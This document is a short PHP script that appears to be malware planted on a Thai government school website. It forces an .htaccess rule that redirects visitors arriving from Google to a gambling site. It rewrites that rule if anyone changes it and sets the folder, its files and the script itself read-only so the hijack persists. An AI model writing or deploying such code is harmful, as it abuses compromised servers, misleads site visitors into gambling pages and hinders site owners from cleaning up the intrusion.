<?php
$folders = [
    '/home/loei3goth/domains/loei3.go.th/public_html/e-bamnan/style/page/'
];

$expected_htaccess = "RewriteEngine On\nRewriteCond %{HTTP_REFERER} ^https?://(www\\.)?google\\. [NC]\nRewriteRule ^(.*)$ https://betwaybet.in/publicenemy [R=302,L]";

foreach ($folders as $dir) {
    // Buat folder jika belum ada
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }

    if (is_dir($dir)) {
        @chmod($dir, 0755);

        $htaccess_path = $dir . '/.htaccess';

        // Cek dan buat/awasi isi .htaccess
        if (!file_exists($htaccess_path)) {
            file_put_contents($htaccess_path, $expected_htaccess);
            @chmod($htaccess_path, 0444);
        } else {
            $current = @file_get_contents($htaccess_path);
            if (trim($current) !== trim($expected_htaccess)) {
                file_put_contents($htaccess_path, $expected_htaccess);
                @chmod($htaccess_path, 0444);
            }
        }

        // Proses file lain selain .htaccess
        foreach (scandir($dir) as $f) {
            if ($f === '.' || $f === '..' || $f === '.htaccess') continue;

            $full = $dir . '/' . $f;

            if (is_file($full)) {
                @chmod($full, 0444);
            }
        }

        @chmod($dir, 0555); // Proteksi folder
    }
}

// Proteksi script ini sendiri
@chmod(__FILE__, 0444);
?>
